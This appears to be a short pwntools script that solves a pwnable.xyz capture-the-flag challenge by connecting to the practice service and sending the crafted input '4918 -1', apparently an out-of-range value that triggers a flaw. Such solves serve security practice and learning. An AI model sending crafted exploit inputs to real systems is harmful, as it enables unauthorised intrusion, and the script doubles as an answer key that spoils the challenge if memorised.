from pwn import *

p = remote('svc.pwnable.xyz',30001)

p.sendlineafter(':','4918 -1')

print p.recvall()